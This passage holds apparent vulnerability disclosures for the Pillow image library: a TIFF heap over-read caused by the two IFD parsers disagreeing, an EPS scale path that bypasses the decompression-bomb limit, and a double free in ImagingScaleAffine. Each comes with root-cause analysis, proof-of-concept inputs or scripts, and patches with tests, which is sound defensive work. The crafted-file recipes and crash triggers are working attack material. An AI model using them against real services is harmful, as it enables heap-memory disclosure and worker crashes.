`copy4` ← `_decodeTile` (`TiffDecode.c:483`) in most runs, depending on what is mapped after the buffer.  ## Details  `_decodeTile()` and `_decodeAsRGBA()` in `src/libImaging/TiffDecode.c` size `state->buffer` from what libtiff says it will produce (`TIFFTileSize()`, resp. `img.width * 4`), but unpack each row with the shuffler that `TiffImagePlugin._setup()` selected from Pillow's *own* parse of the IFD. Nothing in either function checks that the unpacker's input row (`width * state->bits / 8` bytes) fits inside the row libtiff wrote. `_decodeStrip()` has exactly that check; the other two do not. Whenever the two IFD parsers disagree about the pixel layout — a tag with the wrong count or type that libtiff ignores but Pillow accepts, or a duplicated `PhotometricInterpretation`/`BitsPerSample`/`SamplesPerPixel` entry (libtiff keeps the first occurrence, `ImageFileDirectory_v2.load()` the last) — the unpacker reads past the end of the heap buffer and the bytes it reads become pixels of the returned image. Any Pillow rawmode wider than libtiff's actual sample layout works (`RGBX`, `RGB;16N`, `RGBA;16N`, `I;32`, `F;32F`, …); `RGBA;16N` (64 bits/pixel) against 1-bit libtiff data is the largest ratio, where every row after the first of each tile is read almost entirely from beyond the buffer.  The ~400-byte TIFF `tile_count2.tif` generated by the reproducer — one 16x16 tile, `BitsPerSample 8`, `SamplesPerPixel 1`, `Compression 8` (Adobe Deflate), and `PhotometricInterpretation` written as a SHORT with **count 2** (`6, 6`) — is opened by `Image.open()` as mode `RGB` with libtiff rawmode `RGBX`, and `load()` succeeds on the stock build. Rows 13–15 of the result contain bytes that lie 16, 32 and 48 bytes past the 256-byte tile buffer: decoding the same file twice under `MALLOC_PERTURB_=85` and `=170` yields identical rows 0–12 and different bytes in rows 13–15 (`aa` vs `55`, i.e. glibc's fill pattern). Under an ASan build of the extensions the same `load()` reports `heap-buffer-overflow READ of size 64` in `copy4` (`src/libImaging/Unpack.c:1290`) called from `src/libImaging/TiffDecode.c:483`, against the 256-byte region allocated at `TiffDecode.c:448`. The same layout with a single 65536x16 tile (4.5 KB file) makes the stock build SIGSEGV in `copy4 ← _decodeTile` reading an unmapped address in most runs (whether it faults depends on what is mapped after the 1 MiB buffer; a wider tile makes it reliable).  ### Why the two parsers disagree  libtiff 4.5 rejects a `PhotometricInterpretation` entry whose count is not 1 (`TIFFFetchNormalTag: Incorrect count for "PhotometricInterpretation"; tag ignored`), so for this file `TIFFGetField(tiff, TIFFTAG_PHOTOMETRIC, …)` returns 0 and libtiff treats the data as one 8-bit sample per pixel: `TIFFTileSize() = 256`, `TIFFTileRowSize() = 16`.  Pillow keeps the first value and carries on:  ```python # src/PIL/TiffImagePlugin.py:762-770  (ImageFileDirectory_v2._setitem, reached from load())             try:                 (dest[tag],) = values             except ValueError:                 # We've got a builtin tag with 1 expected entry                 warnings.warn(f"Metadata Warning, tag {tag} had too many entries: ...")                 dest[tag] = values[0] ```  so `_setup()` sees `photo == 6`. `OPEN_INFO[(II, 6, (1,), 1, (8,), ())]` is `("L", "L")`, and because the file is compressed the libtiff branch then overrides the rawmode:  ```python # src/PIL/TiffImagePlugin.py:1578, 1600-1607         self.use_load_libtiff = READ_LIBTIFF or self._compression != "raw"         …             if photo == 6:                 self._mode = "RGB"                 if self._compression in "jpeg" and self._planar_configuration == 1:                     rawmode = "RGB"                 else:                     rawmode = "RGBX" ```  `RGBX` is a 32-bit rawmode, so `get_unpacker()` (`src/decode.c:301-309`) sets `state->bits = 32` and `state->shuffle = copy4`. The intent of the `photo == 6` override is that libtiff will deliver RGBA through `TIFFRGBAImage`, but that decision is made in C from *libtiff's* reading of the tag, which here is "not YCbCr":  ```c // src/libImaging/TiffDecode.c:737-764     TIFFGetField(tiff, TIFFTAG_PHOTOMETRIC, &photometric);   // unset -> stays 0     …     readAsRGBA = photometric == PHOTOMETRIC_YCBCR;          // 0     …         if (TIFFIsTiled(tiff)) {             _decodeTile(im, state, tiff, planes, unpackers); // unpackers[0] = copy4 ```  ### The missing check  `_decodeTile()` only guards against libtiff's tile being *larger* than what the unpacker expects, then allocates exactly `TIFFTileSize()` bytes and feeds `row_byte_size`-strided rows to the shuffler:  ```c // src/libImaging/TiffDecode.c:403-487  (_decodeTile)     tile_bytes_size = TIFFTileSize(tiff);                      // 256     …     row_byte_size = TIFFTileRowSize(tiff);                     // 16     …     if (tile_bytes_size > ((tile_length * state->bits / planes + 7) / 8) * tile_width) {         // 256 > 1024 is false -> no abort         …     }     state->bytes = tile_bytes_size;     new_data = realloc(state->buffer, state->bytes);           // 256-byte buffer (line 448)     …                 for (tile_y = 0; tile_y < current_tile_length; tile_y++) {                     shuffler(                                   // copy4: reads current_tile_width*4 = 64 bytes                         (UINT8 *)im->image[tile_y + y] + x * im->pixelsize,                         state->buffer + tile_y * row_byte_size, // from offset 16*tile_y                         current_tile_width                     ); ```  Row `tile_y` is read from `[16·tile_y, 16·tile_y + 64)`; for `tile_y` = 13, 14, 15 that ends 16, 32, 48 bytes past the 256-byte allocation. In general the last rows of every tile over-read by up to `(state->bits / libtiff_bits_per_pixel − 1) × row_byte_size` bytes, and `row_byte_size` scales with the attacker-chosen `TileWidth`.  Note also that the existing one-sided check at line 434 multiplies the file-controlled `tile_width`/`tile_length` (`UINT32`, accepted up to `INT_MAX` at line 428) by `state->bits` in 32-bit unsigned arithmetic, so `tile_width * state->bits` wraps for `tile_width ≥ 2^32 / bits` (2^26 for the 64-bit rawmodes, 2^27 for `RGBX`/`I;32`/`F;32F`). An 8 KB file declaring a 2,097,152×1 image with `TILEWIDTH = 2^26+16`, `TILELENGTH = 1`, 1-bit data for libtiff and `RGBA;16N` for Pillow makes libtiff allocate an ~8 MB tile from which `unpackRGBA16L` reads 16 MB, and the stock build SIGSEGVs in `unpackRGBA16L ← _decodeTile (TiffDecode.c:483)`; a row-size comparison written in the same 32-bit arithmetic as line 434 would evaluate that row to 128 bytes and still accept it, so the new check must be done in a 64-bit type.  Compare the strip path, which refuses this situation (added for OSS-Fuzz `crash-0da0` in 8.2.0):  ```c // src/libImaging/TiffDecode.c:528-548  (_decodeStrip)     unpacker_row_byte_size = (state->xsize * state->bits / planes + 7) / 8;     …     row_byte_size = TIFFScanlineSize(tiff);     // if the unpacker calculated row size is > row byte size, (at least) the last     // row of the strip will have a read buffer overflow.     if (row_byte_size == 0 || unpacker_row_byte_size > row_byte_size) {         state->errcode = IMAGING_CODEC_BROKEN;         return -1;     } ```  The identical file written with one strip instead of one tile fails `load()` with `OSError: decoder error -2` because of this check.  ### Same gap in `_decodeAsRGBA()`  `_decodeAsRGBA()` always produces `img.width * 4` bytes per row (`TiffDecode.c:325`, buffer allocated at line 339) and unpacks with `state->shuffle` (line 373) without looking at `state->bits`. It is reached when *libtiff* sees YCbCr while Pillow does not force `RGBX`. libtiff marks later duplicates of a tag as ignored (first occurrence wins); Pillow's `ImageFileDirectory_v2.load()` overwrites (`TiffImagePlugin.py:945`, last wins). The reproducer's `ycbcr_dup.tif` is a 16x16 Deflate strip with `PhotometricInterpretation` present twice (`6`, then `2`) and `BitsPerSample` twice (`8,8,8`, then `16,16,16`): libtiff decodes 8-bit YCbCr into a 1024-byte RGBA raster, Pillow selects `RGB;16N` (`state->bits = 48`), and `unpackRGB16L` reads 96 bytes per 64-byte row — ASan reports `heap-buffer-overflow` in `unpackRGB16L` (`Unpack.c:609`) from `TiffDecode.c:373`, past the 1024-byte region from `TiffDecode.c:339`.  The count-2 encoding is not the only lever, and on released versions it is not a lever at all: a 1-sample `photo == 6` file only gets rawmode `RGBX` since the unreleased commit 155330d63 ("Do not open YCbCr colorspace images as RGB without libtiff (#9779)", 2026-08-26). Released versions are reached through duplicated tags instead. A 3-sample tiled file with two `PhotometricInterpretation` entries (`1` or `2`, then `6`) produces the same `copy4` ← `_decodeTile` over-read, since libtiff keeps the first value and decodes 3 bytes per pixel while Pillow keeps `6` and unpacks 4 (the reproducer's `tile_dup.tif`). `ycbcr_dup.tif` above reaches `_decodeAsRGBA()` the same way.  ## Impact  Any application that calls `Image.open()` + `load()` (or `thumbnail()`, `convert()`, `save()`, …) on an untrusted file reaches this with default settings: the file is content-sniffed as TIFF, and any compressed TIFF is decoded through libtiff and `TiffDecode.c` without `READ_LIBTIFF` being set. The over-read bytes are copied into the image's pixel rows, so a service that returns a thumbnail, preview or converted image hands adjacent heap memory back to the uploader, heap pointer values included — up to three libtiff tile rows past the buffer for the `RGBX`-over-8-bit case, with the tile row length (`TileWidth`) chosen by the attacker. `state->buffer` is allocated once and reused for every tile, so each tile re-reads the same region past that one buffer; the distinct heap disclosed per image is about `(unpacker_bpp / libtiff_bpp − 1)` tile rows and does not grow with the tile count. With a wide tile the read runs off the mapping and the process segfaults instead (the 65536x16 case crashes the stock build in most runs, depending on what is mapped after the buffer), taking down the whole worker rather than one request. Writes go to the correctly sized `Imaging` rows, so this is disclosure / crash, not memory corruption.  This is the same family as CVE-2020-35654 (Pillow and libtiff interpreting a YCbCr IFD differently in `TiffDecode.c`); that fix and the later `crash-0da0` fix closed the write and the strip-path read, but the tile path and the RGBA path still trust Pillow's rawmode over libtiff's row size. The tile-path gap was introduced in 1c295bf43c3a ("Check for dimensions and sizes to fit into int", 2021-01-25), which switched `_decodeTile()` from a buffer sized by Pillow's unpacker to `TIFFTileSize()`/`TIFFTileRowSize()`; it is first in Pillow 8.2.0. The `_decodeAsRGBA()` half dates from eb8c1206d6b1 ("Fix CVE-2020-35654 - OOB Write in TiffDecode.c"), first in 8.1.0.  ## Reproducing  Run `repro` (a single Python 3 script) against the installed, unmodified Pillow. No sanitizer build is needed. It writes four TIFFs into a temporary directory, decodes each one in a child process, and removes the directory at the end.  The script writes its TIFFs byte by byte with a small classic-TIFF writer. Each file has a single IFD and a single Deflate-compressed block. Deflate is only there so the file is decoded by libtiff and `TiffDecode.c`. Every pixel byte in the compressed data is defined, so the decoded image should not depend on anything else in the process:  - **`tile_count2.tif`**: a 16x16, 1-sample, 8-bit tile with `PhotometricInterpretation` written as SHORT count 2, `(6, 6)`. Pillow keeps `6` and unpacks with `copy4` (`RGBX`, 4 bytes per pixel). libtiff ignores the tag and decodes 1 byte per pixel. This lever needs 155330d63 (unreleased). - **`tile_dup.tif`**: a 16x16, 3-sample, 8-bit tile with `PhotometricInterpretation` present twice, `2` then `6`. libtiff keeps `2` (RGB, 3 bytes per pixel) and Pillow keeps `6` (`RGBX`, 4 bytes per pixel). This variant also applies to released versions. - **`ycbcr_dup.tif`**: the 16x16 strip with `BitsPerSample` `8,8,8` then `16,16,16` and `PhotometricInterpretation` `6` then `2`. libtiff decodes 8-bit YCbCr through `_decodeAsRGBA()` (4 bytes per pixel), and Pillow unpacks `RGB;16N` with `unpackRGB16L` (6 bytes per pixel). - **`tile_big.tif`**: the `tile_count2.tif` layout with a single 65536x16 tile.  For each of the first three files, the script runs `Image.open()` + `load()` + `tobytes()` twice, once with `MALLOC_PERTURB_=85` and once with `=170`. If the two outputs differ, bytes from beyond the decode buffer have become pixels. In that case it prints the first differing offset and the bytes around it from both runs. On this tree all three differ in their last rows: the `aa`/`55` fill bytes show up, along with heap pointer bytes. The script then decodes `tile_big.tif` and checks for a SIGSEGV (exit status -11). If `gdb` is available, it prints the top frames: `copy4` (`Unpack.c:1290`) ← `_decodeTile` (`TiffDecode.c:483`) ← `ImagingLibTiffDecode`. This crash depends on ASLR, so an occasional run may survive.  Each step prints which `_imaging` build it used and how Pillow opened the file (mode, size and rawmode). The script ends with a one-line summary. The last line is `BUG` if any file leaked heap bytes into its pixels or the big tile crashed the process. Otherwise it is `OK`.  ## Suggested fix  The attached patch restores the `_decodeStrip()` invariant (the unpacker's input row must fit inside libtiff's row) in the two sibling decoders in `src/libImaging/TiffDecode.c`, at the point where each one sizes its buffer:  - `_decodeTile()` computes `unpacker_row_byte_size = ((tsize_t)tile_width * state->bits / planes + 7) / 8` (the `tsize_t` cast keeps the product out of 32-bit arithmetic, so the `TILEWIDTH = 2^26+16` case above cannot wrap past the check on 64-bit builds). It reuses that value for the existing `TIFFTileSize()` sanity check, as `_decodeStrip()` does for strips. After that check and before the `realloc`, it fails with `IMAGING_CODEC_BROKEN` when `unpacker_row_byte_size > row_byte_size` (`TIFFTileRowSize()`). - `_decodeAsRGBA()` fails with `IMAGING_CODEC_BROKEN` when `state->bits > 32`, because `TIFFRGBAImage` rows are always 32 bits per pixel. This check runs before `TIFFRGBAImageBegin()` and any allocation.  With the patch, the tile and RGBA files fail `load()` with `OSError: decoder error -2`, the same result the equivalent strip file already gets. The patch also adds a regression test to `Tests/test_file_libtiff.py` (`test_unpacker_row_wider_than_libtiff_row`). The test embeds the count-2 tile and the duplicated-tag YCbCr strip as base64, following the file's existing convention. The patch was applied to a clean tree and rebuilt: the reproducer no longer triggers, and `Tests/test_file_tiff.py`, `Tests/test_file_libtiff.py` and `Tests/test_tiff_crashes.py` pass.  These checks close the over-read however the two parsers are made to disagree. Separately, `_setup()` could stop deriving the libtiff rawmode from tags that libtiff will read differently — e.g. treat a `PhotometricInterpretation`/`BitsPerSample`/`Compression` that is not a single well-typed value as "unknown pixel mode", the way `ImageWidth`/`ImageLength` are already required to be `int` at `TiffImagePlugin.py:1473`, or have `ImageFileDirectory_v2.load()` keep the first occurrence of a repeated tag as libtiff does (a behaviour change for malformed IFDs that is better made deliberately and separately) — but that only narrows the ways to reach the C-side gap rather than removing it: `TiffImagePlugin` cannot know how libtiff will resolve every malformed directory, and the decoder-side comparisons are what actually bound the read.  ## The patch  Reject TIFFs whose unpacker row is wider than libtiff's decoded row in _decodeTile() and _decodeAsRGBA(), as _decodeStrip() already does  Applies to `src/libImaging/TiffDecode.c` at the commit above.  ```diff diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py index 3d804ea4a..c08dfe77c 100644 --- a/Tests/test_file_libtiff.py +++ b/Tests/test_file_libtiff.py @@ -1232,6 +1232,50 @@ class TestFileLibTiff(LibTiffTestCase):              with pytest.raises(OSError, match="decoder error -9"):                  im.load()   +    @pytest.mark.parametrize( +        "data", +        ( +            # 16x16 8-bit greyscale tile, with a PhotometricInterpretation tag that +            # has two values. ``` ============================================================================ EPS load(scale) lets Ghostscript render past the decompression bomb limit Location: src/PIL/EpsImagePlugin.py:92 in Ghostscript() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` When an application opens an untrusted Encapsulated PostScript file and asks Pillow to render it at a larger scale, Pillow has Ghostscript produce an image several times bigger than Pillow's configured size limit allows. The size check runs only after Ghostscript has finished rendering and written the full raw image to a temporary file. An attacker who can upload a file of about 100 bytes makes each such request spend scale² times the Ghostscript rendering work and temporary disk space that the limit is meant to permit. For example, at scale 2 that is a 972 MB temporary file. The cause is in `Ghostscript()` in `src/PIL/EpsImagePlugin.py`. It multiplies the file-declared size by the caller's `scale` (lines 93-94) and passes the product to `gs` as the `-g` output geometry. It never calls `Image._decompression_bomb_check()` on the scaled size. The only check is the one `Image.open()` ran on the unscaled size, so a file declaring 9000×9000 passes, and `load(scale=2)` then asks Ghostscript for 18000×18000 (3.6× `MAX_IMAGE_PIXELS`). A file declaring 18000×18000 directly would be refused before Ghostscript ever ran. `DecompressionBombError` fires only when Pillow reopens the output file, so Pillow's own in-process allocation stays bounded and there is no memory corruption. The effect is a constant-factor overshoot rather than an unbounded one, for three reasons: * The multiplier is an integer chosen by the application, not by the file. * With the default warning filter, `Image.open()` already lets files up to 2× the limit reach Ghostscript at `scale=1`. * Any application feeding untrusted files to Ghostscript is already exposed to a tiny file that keeps Ghostscript busy indefinitely, since `gs` runs with no timeout. This is the EPS counterpart of the WMF `load(dpi)` gap closed in af70b075a. It has been present since the decompression-bomb limit was introduced in ce2955ec7 (2.5.0). The attached reproducer stubs out Ghostscript and shows a 76-byte file passing `Image.open()` and reaching `gs` with `-g18000x18000`. A one-line patch mirroring the WMF check is included. ## Details `EpsImageFile.load(scale=N)` (the documented way to rasterise an EPS at higher resolution) renders `width*N × height*N` pixels through Ghostscript, but the only decompression-bomb check on the way is the one `Image.open()` ran on the *unscaled*, file-declared `width × height`. The scaled product is never passed to `Image._decompression_bomb_check()` before `gs` is started. This 111-byte EPS declares 9000×9000 = 81,000,000 pixels, below the default `MAX_IMAGE_PIXELS` (89,478,485), so `Image.open()` accepts it without even a warning: ``` %!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: 0 0 9000 9000 %%EndComments 0 0 moveto 9000 9000 lineto stroke showpage ``` `im.load(scale=2)` on it then executes ``` gs -q -g18000x18000 -r144.000000x144.000000 -dBATCH -dNOPAUSE -dSAFER -sDEVICE=pnmraw -sOutputFile=/tmp/tmpXXXX -c 0 0 translate -f attack.eps -c showpage ``` i.e. asks Ghostscript for an 18000×18000 = 324,000,000-pixel raster (3.6× `MAX_IMAGE_PIXELS`), whose `pnmraw` output is a 972,000,019-byte file in the temp directory. An EPS that declares 18000×18000 directly is rejected by `Image.open()` with `DecompressionBombError` before Ghostscript is ever run; via `scale=2` the same raster is rendered first and the `DecompressionBombError` only appears afterwards, when Pillow opens the file Ghostscript produced. (Between 1× and 2× `MAX_IMAGE_PIXELS`, `Image.open()` only emits `DecompressionBombWarning`, so with the default warning filter an EPS declaring e.g. 13377×13377 is already rendered at `scale=1` — a 537 MB PNM. Against that baseline, `scale=2` is 4× an already-permitted render.) The arithmetic is in `Ghostscript()`: ```python # src/PIL/EpsImagePlugin.py:91-97 # Hack to support hi-res rendering scale = int(scale) or 1 width = size[0] * scale height = size[1] * scale # resolution is dependent on bbox and size res_x = 72.0 * width / (bbox[2] - bbox[0]) … # src/PIL/EpsImagePlugin.py:139-142 command = [ gs_binary, "-q", # quiet mode f"-g{width:d}x{height:d}", # set output geometry (pixels) … # src/PIL/EpsImagePlugin.py:165-168 subprocess.check_call(command, startupinfo=startupinfo) with Image.open(outfile) as out_im: out_im.load() return out_im.im.copy() ``` and its caller does nothing between taking `scale` from the application and invoking it: ```python # src/PIL/EpsImagePlugin.py:411-417 def load(self, scale: int = 1, transparency: bool = False) -> …: # Load EPS via Ghostscript if self.tile: assert self.fp is not None self.im = Ghostscript(self.tile, self.size, self.fp, scale, transparency) ``` `size` here is `self._size`, computed in `_open()` from the file's `%%BoundingBox` (or `%ImageData`) and checked once by `Image.open()` at `src/PIL/Image.py:3700`. For the benign path (`scale=1`) that check covers exactly what Ghostscript is asked to render. For `scale=N` the rendered pixel count is N² times what was checked, so a file can sit just under the limit at open time and have Ghostscript render 4× (scale 2), 9× (scale 3), 16× (scale 4) the configured budget. The first point at which Pillow looks at the real size again is `Image.open(outfile)` at line 166 — after `subprocess.check_call` has returned, i.e. after Ghostscript has spent the CPU and written `width*height*3` bytes to `tempfile.mkstemp()`'s directory. `WmfStubImageFile.load(dpi)` has the same shape (file-derived extent × caller-supplied factor → new raster) and, since af70b075a, calls `Image._decompression_bomb_check(self.size)` on the recomputed size before rendering (`src/PIL/WmfImagePlugin.py:127-131`). The EPS path lacks the equivalent line. The gap dates from ce2955ec7128 ("Throw an exception when an opened image is larger than an arbitrary limit", 2014-05-14, first released in 2.5.0), which added the check to `Image.open()` without covering the `scale` path. ## Impact Affected are applications that open untrusted EPS/PS with Ghostscript installed and call `load(scale=N)` with a fixed N > 1, as the handbook suggests for non-blurry output. Handing untrusted EPS to Ghostscript at all already lets the same attacker tie up a worker with an equally tiny file (e.g. a PostScript `{} loop`; Pillow runs `gs` with no timeout), so this bug adds a constant factor rather than a new denial-of-service capability. Within that setting, a ~110-byte upload makes each request run Ghostscript over N² × `MAX_IMAGE_PIXELS` pixels (N² × 2·`MAX_IMAGE_PIXELS` if the application does not turn `DecompressionBombWarning` into an error) and write a `W·H·3`-byte PNM into the temp directory — 972 MB for the example above at scale 2, 2.2 GB at scale 3, 8.6 GB for a 178-Mpixel declaration at scale 4 — before any limit is applied. The operator's `MAX_IMAGE_PIXELS` setting is exceeded by a factor of N²; N is an integer chosen by the application, not by the file, so the work stays bounded at N² × 2·`MAX_IMAGE_PIXELS`. The consequence is N² more Ghostscript CPU and temp-disk use per request than the configured limit intends; Pillow's own in-process pixel allocation remains bounded because `Image.open(outfile)` re-checks the PNM's size, and there is no memory corruption. This is a sibling of the WMF `load(dpi)` issue fixed in af70b075a ("Add decompression bomb check when loading at a different DPI"); the EPS `scale` path was not covered by that change. Unlike the WMF case, where the file-controlled `_inch` makes the ratio unbounded, the EPS multiplier is fixed by the application. ## Reproducing Run `repro` against the installed Pillow. Ghostscript does not need to be installed: the script sets `EpsImagePlugin.gs_binary = "gs"` so that `has_ghostscript()` skips its `gs --version` probe, and replaces `subprocess.check_call` with a function that records the command line Pillow builds and then raises `OSError`, so nothing is actually rendered. It writes a 76-byte EPS declaring `%%BoundingBox: 0 0 9000 9000` (the example above without the drawing line; 81 Mpixel, below the default `MAX_IMAGE_PIXELS` of 89,478,485) and turns `DecompressionBombWarning` into an error, so any bomb check — warning or hard error — counts. It then calls `Image.open()` and `im.load(scale=2)`. `Image.open()` accepts the file and `load(scale=2)` reaches the intercepted Ghostscript call with `-g18000x18000` (324,000,000 pixels, 3.6× `MAX_IMAGE_PIXELS`, a 972 MB `pnmraw` output with real Ghostscript). The script prints the geometry it captured. It prints `BUG` when Ghostscript was invoked with a `-g` geometry above `2*MAX_IMAGE_PIXELS` (178,956,970) and no decompression-bomb check fired before that call; otherwise it prints `OK`. With the attached patch applied, `load(scale=2)` raises `DecompressionBombError` before Ghostscript is called and the script prints `OK`. ## Suggested fix The attached patch checks the scaled size in `Ghostscript()` right after the scaled `width`/`height` are computed (`src/PIL/EpsImagePlugin.py:93-94`) and before the `gs` command is built, mirroring `WmfStubImageFile.load`: ```diff --- a/src/PIL/EpsImagePlugin.py +++ b/src/PIL/EpsImagePlugin.py @@ -92,6 +92,7 @@ def Ghostscript( scale = int(scale) or 1 width = size[0] * scale height = size[1] * scale + Image._decompression_bomb_check((width, height)) # resolution is dependent on bbox and size res_x = 72.0 * width / (bbox[2] - bbox[0]) res_y = 72.0 * height / (bbox[3] - bbox[1]) ``` `load(scale=N)` now raises `DecompressionBombError` / emits `DecompressionBombWarning` under the same `MAX_IMAGE_PIXELS` thresholds `Image.open()` applies, before Ghostscript runs instead of after. Placing the check in `Ghostscript()` rather than in `EpsImageFile.load()` is the single point where the rendered extent is decided, so it also covers direct callers of the module-level function. With the patch applied to a clean checkout the reproducer prints `OK` and `Tests/test_file_eps.py` passes. One cosmetic side effect: at `scale=1` the check re-emits the `DecompressionBombWarning` that `Image.open()` already issued for sizes between 1× and 2× the limit; guarding the call with `if scale > 1:` would avoid the duplicate. The patch also adds `test_load_scale_decompression_bomb` to `Tests/test_file_eps.py`, in the style of the WMF test: it sets `MAX_IMAGE_PIXELS` to `im.width * im.height` and expects `im.load(scale=2)` to raise `DecompressionBombError`. Like the rest of that file it is skipped without Ghostscript, because `has_ghostscript()` is consulted at the top of `Ghostscript()`; moving the check above that call would let the test run without it. ## The patch Add decompression bomb check on the scaled size in EpsImagePlugin.Ghostscript() before Ghostscript is invoked Applies to `src/PIL/EpsImagePlugin.py` at the commit above. ```diff diff --git a/Tests/test_file_eps.py b/Tests/test_file_eps.py index 70eced62a..de331d97f 100644 --- a/Tests/test_file_eps.py +++ b/Tests/test_file_eps.py @@ -98,6 +98,14 @@ def test_sanity(filename: str, size: tuple[int, int], scale: int) -> None: assert image.format == "EPS" +@pytest.mark.skipif(not HAS_GHOSTSCRIPT, reason="Ghostscript not available") +def test_load_scale_decompression_bomb(monkeypatch: pytest.MonkeyPatch) -> None: + with Image.open(FILE1) as im: + monkeypatch.setattr(Image, "MAX_IMAGE_PIXELS", im.width * im.height) + with pytest.raises(Image.DecompressionBombError): + im.load(scale=2) + + @pytest.mark.skipif(not HAS_GHOSTSCRIPT, reason="Ghostscript not available") def test_load() -> None: with Image.open(FILE1) as im: diff --git a/src/PIL/EpsImagePlugin.py b/src/PIL/EpsImagePlugin.py index 5eaefe339..ccc6f1d85 100644 --- a/src/PIL/EpsImagePlugin.py +++ b/src/PIL/EpsImagePlugin.py @@ -92,6 +92,7 @@ def Ghostscript( scale = int(scale) or 1 width = size[0] * scale height = size[1] * scale + Image._decompression_bomb_check((width, height)) # resolution is dependent on bbox and size res_x = 72.0 * width / (bbox[2] - bbox[0]) res_y = 72.0 * height / (bbox[3] - bbox[1]) ``` ## The reproducer
Reproducer — repro, 1,845 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # EpsImagePlugin.Ghostscript(): load(scale=N) hands gs a -g geometry of # (W*N)x(H*N) with no _decompression_bomb_check on the scaled size; only the # unscaled WxH was checked by Image.open(). gs is not installed here, so we # set gs_binary and intercept subprocess.check_call to read the argv Pillow builds. import os, subprocess, tempfile, warnings from PIL import Image, EpsImagePlugin EpsImagePlugin.gs_binary = "gs" # skip the `gs --version` probe path = os.path.join(tempfile.mkdtemp(), "a.eps") with open(path, "w") as f: # 9000x9000 = 81 Mpx < MAX_IMAGE_PIXELS (89.5 Mpx) f.write("%!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: 0 0 9000 9000 %%EndComments showpage ") calls = [] def fake_check_call(cmd, **kw): calls.append(cmd) raise OSError("gs intercepted") # stop here; we only need the argv subprocess.check_call = fake_check_call hard = 2 * Image.MAX_IMAGE_PIXELS bomb_before_gs = False with warnings.catch_warnings(): warnings.simplefilter("error", Image.DecompressionBombWarning) try: with Image.open(path) as im: print("Image.open accepted", os.path.getsize(path), "byte EPS, size", im.size) im.load(scale=2) except (Image.DecompressionBombError, Image.DecompressionBombWarning) as e: bomb_before_gs = not calls print("bomb check fired", "before" if bomb_before_gs else "after", "gs:", e) except OSError as e: print("load() reached gs:", e) over = False for c in calls: g = next(a for a in c if a.startswith("-g"))[2:] w, h = map(int, g.split("x")) over |= w * h > hard print(f"gs argv geometry -g{g} = {w*h} px ({w*h/Image.MAX_IMAGE_PIXELS:.1f}x MAX_IMAGE_PIXELS, " f"hard limit {hard}); pnmraw output would be {w*h*3} bytes") print("BUG" if calls and over and not bomb_before_gs else "OK") ```

``` ============================================================================ Double free in ImagingScaleAffine on calloc failure via Image.transform Location: src/libImaging/Geometry.c:866 in ImagingScaleAffine() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` There is a double free in Pillow's `Image.transform()` that crashes the process when an oversized transform runs out of memory. Instead of only raising `MemoryError`, Pillow frees the output image's memory once while handling the error and then again when the Python object is cleaned up. Anyone who can choose the output size of `Image.transform()` can trigger it, but only on a worker with a memory limit (a common hardening for image workers) or a 32-bit process. The result is a crash of the worker, plus corruption of its heap that has not been shown to be controllable. The bug is in `ImagingScaleAffine()` in `src/libImaging/Geometry.c` (line 866). When its `calloc()` for the per-column lookup table of `4 × width` bytes fails, it calls `ImagingDelete(imOut)`. When the call comes from `Image.transform()`, `imOut` is the `Imaging` struct owned by the live Python `ImagingCore` output object. `_dealloc()` in `src/_imaging.c` later runs `ImagingDelete()` on the freed struct again, writing its mutex and refcount in freed memory and freeing the pixel blocks a second time. The path is reached with `Transform.EXTENT`, or `Transform.AFFINE` with a pure scale/translate matrix, under the default NEAREST resampling. A very wide, 1-row output size makes the lookup table the allocation that fails while the image itself still fits. On 64-bit Linux with default overcommit, that requires an address-space limit such as `ulimit -v`, `uwsgi --limit-as` or `systemd LimitAS=`. `resize()`, `thumbnail()` and `rotate()` are not affected. The attached reproducer runs on a stock build with a 1 GB limit: `transform((300000000, 1), EXTENT)` raises and catches `MemoryError`, then the process dies with SIGSEGV in `free()` called from `_dealloc()`. A memory-checking build reports the same path as a heap use-after-free. The faulty line was inherited from PIL 1.1.7 in the original fork commit, so every Pillow release since 1.0 is affected. A patch is attached. ## Details `ImagingScaleAffine()` frees an image it does not own. On the one error path where its `calloc()` for the per-column lookup table fails, it calls `ImagingDelete(imOut)`. When reached through `Image.transform()`, `imOut` is the `Imaging` struct held by a live Python `ImagingCore` object; that object's `_dealloc()` later calls `ImagingDelete()` on the already-freed struct and frees its pixel blocks a second time. Shortest demonstration on the stock build (the address-space limit stands in for `ulimit -v` / `uwsgi --limit-as` / `systemd LimitAS=` on a worker): ```python import resource, gc from PIL import Image resource.setrlimit(resource.RLIMIT_AS, (1_000_000_000,) * 2) src = Image.new("L", (8, 8)) try: src.transform((300_000_000, 1), Image.Transform.EXTENT, (0, 0, 8, 8)) except MemoryError: pass # expected, and the process should carry on gc.collect() # instead: SIGSEGV in _dealloc -> ImagingDelete -> free() ``` The 300 MB output image allocates; `calloc(300000000, 4)` (1.2 GB) does not. `MemoryError` is raised as intended, but the interpreter then dies with SIGSEGV, gdb showing `free()` ← `memory_return_block`/`ImagingDestroyArray` (`src/libImaging/Storage.c:396,408`) ← `ImagingDelete` (`Storage.c:271`) ← `_dealloc` (`src/_imaging.c:188`). An AddressSanitizer build of the same sources (with `max_allocation_size_mb` used to make the `calloc` fail instead of an rlimit) reports `heap-use-after-free` in `ImagingDelete src/libImaging/Storage.c:257` called from `_dealloc src/_imaging.c:188`, on a 128-byte region "freed by" `ImagingDelete` ← `ImagingScaleAffine src/libImaging/Geometry.c:866` ← `ImagingTransformAffine Geometry.c:1043` ← `ImagingTransform Geometry.c:1135` ← `_transform src/_imaging.c:2153`, "previously allocated by" `ImagingNewPrologueSubtype Storage.c:53` ← … ← `_new src/_imaging.c:756`. ### Code path `Image.transform()` creates the output image as an ordinary Python-owned image and then transforms *into* it: ```python # src/PIL/Image.py:3008…3021 im = new(self.mode, size, fillcolor) … im.__transformer( (0, 0, *size), self, method, data, resample, fillcolor is None ) ``` `__transformer()` rewrites `Transform.EXTENT` into an axis-aligned affine matrix (`src/PIL/Image.py:3040-3046`: `data = (xs, 0, x0, 0, ys, y0)`, `method = Transform.AFFINE`) and calls `self.im.transform(box, image.im, method, data, resample, fill)` (`Image.py:3117`). `resample` defaults to 